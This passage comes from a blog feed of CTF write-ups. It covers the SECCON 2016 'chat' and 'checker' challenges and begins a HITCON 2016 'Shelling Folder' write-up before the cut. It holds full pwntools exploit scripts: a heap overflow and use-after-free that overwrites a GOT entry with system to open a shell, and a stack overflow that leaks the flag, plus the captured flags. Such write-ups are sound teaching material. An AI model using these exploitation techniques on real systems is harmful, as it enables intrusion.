class="line">0x1234060 |              | unsortbin &lt;-- oh yeah</span><br><span class="line">          +--------------+</span><br><span class="line">0x1234068 |          0x21|</span><br><span class="line">          +--------------+</span><br><span class="line">          |     .        |</span><br><span class="line">          |     .        |</span><br><span class="line">          |     .        |</span><br><span class="line">          |     .        |</span><br><span class="line">          |     .        |</span><br><span class="line">0x1234090 |     0x1234050| userC</span><br><span class="line">          |              |</span><br><span class="line">          |              |</span><br><span class="line">          |              |</span><br><span class="line">          +--------------+</span><br></pre></td></tr></table></figure></p><p>I found that I can corrupt the header of unsortbin chunk <code>0x1234060</code> by overflowing the <code>userC-&gt;name</code> buffer ! Later I realized that this is because program use <code>strdup</code> to allocate the buffer of <code>userC-&gt;name</code>. If we set the name length of <code>userC</code> less than 24, it will allocate a buffer with size <code>0x20</code> ( fastbin[0] ) . But when we change a user’s name, it allow us to input at most 32 characters, which will overflow the name buffer !</p><p>By corrupting the meta data and change the chunk size from <code>0x21</code> to <code>0xa1</code> ( the size of a <code>message</code> structure ), we can allocate a fake chunk (<code>0x1234060</code>, size = <code>0xa1</code>), and forge the data structure at <code>0x1234090</code> ( a <code>user</code> structure ), change the <code>userC-&gt;name</code> pointer from <code>0x1234050</code> into another memory address, then we can do the “write-anywhere” attack ( ex. GOT hijacking ) by changing <code>userC</code>‘s name .  </p><p>So to sum up:</p><ol><li>Overflow <code>userC-&gt;name</code>, change the unsortbin chunk size into <code>0xa1</code>.</li><li>Post a tweet, this will allocate the memory from unsortbin.</li><li>Craft the tweet message, forge a fake <code>user</code> structure (modify the <code>userC-&gt;name</code> pointer).</li><li>Change the name of <code>userC</code> to overwrite the memory.  </li></ol><p>Looks simple huh? Except it’s <strong>not</strong>. To successfully change a user name, <strong>both the old user name and the new user name’s first character has to be printable</strong>. For example, if we want to hijack <code>free</code>‘s GOT:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ tel 0x603010</span><br><span class="line">00:0000|  0x603010 --&gt; 0x7eff900f44a0 (&lt;_dl_runtime_resolve&gt;:   sub    rsp,0x38)</span><br><span class="line">01:0008|  0x603018 --&gt; 0x7eff8fd9bd00 (&lt;__GI___libc_free&gt;:      mov    rax,QWORD PTR [rip+0x33b1e1]        # 0x7eff900d6ee8)</span><br><span class="line">02:0016|  0x603020 --&gt; 0x7eff8fda19b0 (&lt;strlen&gt;:        pxor   xmm8,xmm8)</span><br><span class="line">03:0024|  0x603028 --&gt; 0x4007f6 (&lt;__stack_chk_fail@plt+6&gt;:      push   0x2)</span><br><span class="line">04:0032|  0x603030 --&gt; 0x7eff8fd8b100 (&lt;setbuf&gt;:        mov    edx,0x2000)</span><br><span class="line">05:0040|  0x603038 --&gt; 0x7eff8fd9fd40 (&lt;__strchr_sse2&gt;: movd   xmm1,esi)</span><br><span class="line">06:0048|  0x603040 --&gt; 0x7eff8fd3ae50 (&lt;__libc_start_main&gt;:     push   r14)</span><br><span class="line">07:0056|  0x603048 --&gt; 0x7eff8fd87160 (&lt;_IO_fgets&gt;:     push   r12)</span><br></pre></td></tr></table></figure></p><p>We can see that <code>free</code>‘s GOT ( <code>0x603018</code> ) stores the address <code>0x7eff8fd9bd00</code>. Its first character is <code>0x00</code>, which is not printable, making us unable to change the content of <code>0x603018</code>. Even if its first character is printable, the <code>system</code>‘s offset in the libc is <code>0x46590</code> – another non-printable first character, which will make the program remove (freeing) the user name and crash the program ( for trying to free a GOT entry ). </p><p>So how are we gonna bypass the check? Well it’s a little bit tricky, but also very interesting. I notice that the GOT entry of <code>stack_chk_fail</code> stores the address <code>0x4007f6</code>. Although <code>0xf6</code> is non-printable, the third character <code>0x40</code> is a printable character. Hmmmm, if only I can make <code>0x40</code> to our user name’s first character…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ tel 0x60302a</span><br><span class="line">00:0000|  0x60302a --&gt; 0xb100000000000040   &lt;-- printable first character !</span><br><span class="line">01:0008|  0x603032 --&gt; 0xfd4000007eff8fd8 </span><br><span class="line">02:0016|  0x60303a --&gt; 0xae5000007eff8fd9 </span><br><span class="line">03:0024|  0x603042 --&gt; 0x716000007eff8fd3 </span><br><span class="line">04:0032|  0x60304a --&gt; 0x8e0000007eff8fd8 </span><br><span class="line">05:0040|  0x603052 --&gt; 0xd2b000007eff8fe5 </span><br><span class="line">06:0048|  0x60305a --&gt; 0x86600007eff8fd6 </span><br><span class="line">07:0056|  0x603062 --&gt; 0x8e80000000000040</span><br></pre></td></tr></table></figure></p><p>That’s right ! If we change the <code>userC-&gt;name</code> pointer into <code>0x60302a</code>, we can start overwriting the content from <code>0x60302a</code>. We first filled the GOT entry of <code>stack_chk_fail</code> with some printable characters ( now the first character of new user name is printable ! ), then we can start hijack some GOT ! </p><p>Here I decided to hijack <code>strchr</code>‘s GOT so when the program call <code>strchr(buf, 10)</code> ( <code>buf</code> stores our input ) it will call <code>system(buf)</code> instead.<br><figure class="highlight python"><figcaption><span>exp_chat.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"chat.pwn.seccon.jp"</span></span><br><span class="line">PORT = <span class="number">26895</span></span><br><span class="line">ELF_PATH = <span class="string">"./chat"</span></span><br><span class="line">LIBC_PATH = <span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span> <span class="comment"># ubuntu 14.04 64bit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_recvuntil</span><span class="params">(s, delim)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> delim <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        c = s.recv(<span class="number">1</span>)</span><br><span class="line">        res += c</span><br><span class="line">        sys.stdout.write(c)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myexec</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signup</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tweet</span><span class="params">(msg)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dm</span><span class="params">(user, msg)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, user)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signout</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"7"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    signup(<span class="string">"A"</span>*<span class="number">4</span>) <span class="comment"># fastbin[0] * 2</span></span><br><span class="line">    signup(<span class="string">"B"</span>*<span class="number">4</span>) <span class="comment"># fastbin[0] * 2</span></span><br><span class="line">    signup(<span class="string">"C"</span>*<span class="number">30</span>) <span class="comment"># fastbin[0] * 1 + fastbin[1] * 1 </span></span><br><span class="line"></span><br><span class="line">    signin(<span class="string">"A"</span>*<span class="number">4</span>)</span><br><span class="line">    tweet(<span class="string">"aaaa"</span>) </span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    signin(<span class="string">"B"</span>*<span class="number">4</span>)</span><br><span class="line">    tweet(<span class="string">"bbbb"</span>)</span><br><span class="line">    dm(<span class="string">"A"</span>*<span class="number">4</span>, <span class="string">"BA"</span>) <span class="comment"># for creating dangling pointer</span></span><br><span class="line">    dm(<span class="string">"C"</span>*<span class="number">30</span>, <span class="string">"BC"</span>)</span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    signin(<span class="string">"C"</span>*<span class="number">30</span>)</span><br><span class="line">    tweet(<span class="string">"cccc"</span>)</span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    signin(<span class="string">"B"</span>*<span class="number">4</span>)</span><br><span class="line">    change_name(<span class="string">"\t"</span>) <span class="comment"># invalid, will remove user (user AAAA's DM become dangling pointer)</span></span><br><span class="line">    signin(<span class="string">"C"</span>*<span class="number">30</span>)</span><br><span class="line">    change_name(<span class="string">"\t"</span>) </span><br><span class="line"></span><br><span class="line">    signup(<span class="string">"d"</span>*<span class="number">7</span>)</span><br><span class="line">    signin(<span class="string">"d"</span>*<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">6</span>,<span class="number">2</span>,<span class="number">-1</span>): <span class="comment"># null out the address</span></span><br><span class="line">        change_name(<span class="string">"d"</span>*i)</span><br><span class="line"></span><br><span class="line">    malusr = p64(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">    change_name(malusr) <span class="comment"># AAAA's DM's sender-&gt;name will pointer to __libc_start_main@got.plt</span></span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    signin(<span class="string">"A"</span>*<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>) <span class="comment"># show DM, leak libc</span></span><br><span class="line">    r.recvuntil(<span class="string">"["</span>)</span><br><span class="line">    libc.address += u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"libc base: "</span>+hex(libc.address))</span><br><span class="line">    log.success(<span class="string">"system: "</span>+hex(system_addr))</span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># somehow we can overwrite an unsortbin chunk's size</span></span><br><span class="line">    <span class="comment"># enlarge the size, so we can overflow the heap buffer and fake some data structure</span></span><br><span class="line">    signin(malusr)</span><br><span class="line">    change_name(<span class="string">"i"</span>*<span class="number">24</span>+p8(<span class="number">0xa1</span>))</span><br><span class="line">    tweet(<span class="string">"fuck"</span>) <span class="comment"># will allocate chunk from smallbin</span></span><br><span class="line">    change_name(p8(<span class="number">0x40</span>)) <span class="comment"># make this user into right index</span></span><br><span class="line">    tweet(<span class="string">"7"</span>*<span class="number">16</span>+p64(<span class="number">0x60302a</span>)) <span class="comment"># allocate chunk from unsortbin, overwrite data structure. We can now start overwriting memory from 0x60302a</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># start overwriting, we wish to overwrite strchr's got</span></span><br><span class="line">    change_name(<span class="string">"A"</span>*<span class="number">6</span>+<span class="string">"B"</span>*<span class="number">8</span>+p64(system_addr)) <span class="comment"># padding + padding + strchr's got (overwrite to system)</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"sh\x00"</span>) <span class="comment"># strchr("sh", 10) --&gt; system("sh")</span></span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></p><p>First time solving a 500 points pwn challenge ! WOOHOO ! </p><p>flag: <code>SECCON{51mpl3_ch47_l1k3_7w1*73*}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Exploit&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 500&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="heap" scheme="https://bruce30262.github.io/tags/heap/"/>
    
      <category term="use_after_free" scheme="https://bruce30262.github.io/tags/use-after-free/"/>
    
      <category term="heap_overflow" scheme="https://bruce30262.github.io/tags/heap-overflow/"/>
    
      <category term="SECCON" scheme="https://bruce30262.github.io/tags/SECCON/"/>
    
  </entry>
  
  <entry>
    <title>SECCON CTF 2016 -- checker</title>
    <link href="https://bruce30262.github.io/2016/12/12/2016-12-12-seccon-ctf-2016-checker/"/>
    <id>https://bruce30262.github.io/2016/12/12/2016-12-12-seccon-ctf-2016-checker/</id>
    <published>2016-12-12T00:02:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Exploit<br><strong>Points:</strong> 300</p><a id="more"></a>  <p>64 bit ELF with Full RELRO, stack canary, NX enabled, No PIE.  </p><p>A quick run of the program:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ ./checker </span><br><span class="line">Hello! What is your name?</span><br><span class="line">NAME : 123</span><br><span class="line"></span><br><span class="line">Do you know flag?</span><br><span class="line">&gt;&gt; 123</span><br><span class="line"></span><br><span class="line">Do you know flag?</span><br><span class="line">&gt;&gt; yes</span><br><span class="line"></span><br><span class="line">Oh, Really??</span><br><span class="line">Please tell me the flag!</span><br><span class="line">FLAG : asdf</span><br><span class="line">You are a liar...</span><br></pre></td></tr></table></figure></p><p>By reversing the binary, we found that the program use a function named <code>getaline()</code> to read the user input.<br><figure class="highlight c"><figcaption><span>getaline</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( buf &amp;&amp; read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">        buf = <span class="number">0</span>;</span><br><span class="line">    *(_BYTE *)(a1 + (<span class="keyword">signed</span> <span class="keyword">int</span>)v4++) = buf; <span class="comment">// a1 = input buffer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>We can see that the <code>getaline()</code> function is just like <code>gets()</code> in <code>stdio.h</code>, so the program itself has multiple stack overflow vulnerabilities.   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./checker</span><br><span class="line">Hello! What is your name?</span><br><span class="line">NAME : 123</span><br><span class="line"></span><br><span class="line">Do you know flag?</span><br><span class="line">&gt;&gt; yes</span><br><span class="line"></span><br><span class="line">Oh, Really??</span><br><span class="line">Please tell me the flag!</span><br><span class="line">FLAG : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">You are a liar...</span><br><span class="line">*** stack smashing detected ***: ./checker terminated</span><br><span class="line">[1]    70548 abort      ./checker</span><br></pre></td></tr></table></figure><p>Although we can easily overwrite the return address, however the program has the stack smashing protector (SSP) enabled. Luckliy, the program will read the flag’s content and stored it into a buffer which lies in the <code>.bss</code> section before entering the main function. So, we can try to <strong>overwrite the content of <code>argv[0]</code> ( which stores a <code>char*</code> pointer of the program file path ) into the flag buffer’s address</strong>. Then, we smash the stack and trigger the SSP, which will then output the following error message:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***: [flag content] terminated</span><br></pre></td></tr></table></figure></p><p>Notice that the original content of <code>argv[0]</code> stores a 6 bytes memory address, while the flag’s buffer address is 3 bytes (<code>0x6010c0</code>). So we’ll have to null out the <code>argv[0]</code> first before we change it into <code>0x6010c0</code>, or else it will crash the program before it was able to output the error message.<br><figure class="highlight python"><figcaption><span>exp_checker.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"checker.pwn.seccon.jp"</span></span><br><span class="line">PORT = <span class="number">14726</span></span><br><span class="line">ELF_PATH = <span class="string">"./checker"</span></span><br><span class="line">LIBC_PATH = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line"><span class="comment">#libc = ELF(LIBC_PATH)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_recvuntil</span><span class="params">(s, delim)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> delim <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        c = s.recv(<span class="number">1</span>)</span><br><span class="line">        res += c</span><br><span class="line">        sys.stdout.write(c)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myexec</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line"></span><br><span class="line">    pad = <span class="number">0x178</span></span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">": "</span>, <span class="string">"aaaa"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># null out argv[0]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        payload = <span class="string">"A"</span>*pad + <span class="string">"B"</span>*i</span><br><span class="line">        r.sendlineafter(<span class="string">"&gt;&gt; "</span>, payload)</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite argv[0] to flag buffer</span></span><br><span class="line">    payload = <span class="string">"A"</span>*pad + p64(<span class="number">0x6010c0</span>)</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">": "</span>, payload)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></p><p>Although the exploit works on the local machine, it failed to work on the remote side. I sent the payload for like a hundred times and it just won’t give me the flag. It really frustrated me at that moment because I was so close to capture the flag and the contest is about to end in 5 minutes……  </p><p>But there’s nothing more I can do, so I just keep sending the same payload again and again, hoping that  it will work at the end of the contest. And then, something amazing happened…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to checker.pwn.seccon.jp on port 14726: Done</span><br><span class="line">You are a liar...</span><br><span class="line">*** stack smashing detected ***: SECCON&#123;y0u_c4n&apos;7_g37_4_5h3ll,H4h4h4&#125; terminated</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure></p><p>lol WTF ? </p><p>I still don’t know why it will work at the very end of the contest until now ! I mean it’s the same payload ! How is this even possible ? Anyway I managed to submit the flag right before the end of the contest and get the damn 300 points … What an end @_@!  </p><p>flag: <code>SECCON{y0u_c4n&#39;7_g37_4_5h3ll,H4h4h4}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Exploit&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 300&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="BOF" scheme="https://bruce30262.github.io/tags/BOF/"/>
    
      <category term="SECCON" scheme="https://bruce30262.github.io/tags/SECCON/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2016 Quals -- Shelling Folder</title>
    <link href="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-shelling-folder/"/>
    <id>https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-shelling-folder/</id>
    <published>2016-10-10T08:11:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> pwn<br><strong>Points:</strong> 200</p><a id="more"></a>  <p>64 bit ELF, with all the protection enabled.  </p><p>The program is a simple file system. You can create or delete files and folders, list files in a folder, change the current folder and calculate the size of a folder.  </p><p>It’s a unix-like file system, where folders are also a special type of file. Both folders and files are stored in the program with the following data structure:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">sub_file</span>[10];</span> <span class="comment">// will all be null if it's a normal file</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">parent_folder</span>;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span 